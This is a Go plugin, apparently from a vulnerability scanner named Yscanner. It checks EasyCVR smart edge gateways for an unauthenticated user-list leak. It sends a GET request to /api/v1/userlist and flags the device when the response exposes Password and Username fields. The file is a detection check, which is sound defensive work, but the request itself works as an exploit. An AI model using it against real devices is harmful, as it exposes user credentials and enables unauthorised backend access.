package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("easycvr_info_leak", &easycvr_info_leak{})
}

type easycvr_info_leak struct{}

func (p *easycvr_info_leak) Info() PluginInfo {
	return PluginInfo{
		Name:     "EasyCVR 智能边缘网关用户信息泄漏漏洞",
		VulnInfo: "EasyCVR智能边缘网关是一种基于边缘计算和人工智能技术的设备，旨在提供高效的视频监控和智能分析解决方案。EasyCVR智能边缘网关存在userlist 信息泄漏，攻击者可以直接登录后台，进行非法操作。",
		VulnID:   "",
		Level:    "HIGH",
		URL:      "",
		Version:  "",
		CWE:      "",
	}
}

func (p *easycvr_info_leak) Check(netloc string) bool {
	payload := "/api/v1/userlist?pageindex=0&pagesize=10"
	req, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 5)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "\"Password\":") &&
		strings.Contains(resp.ResponseRaw, "\"Username\":") && strings.Contains(resp.ResponseRaw, "\"CreateAt\":") {
		return true
	}
	return false
}
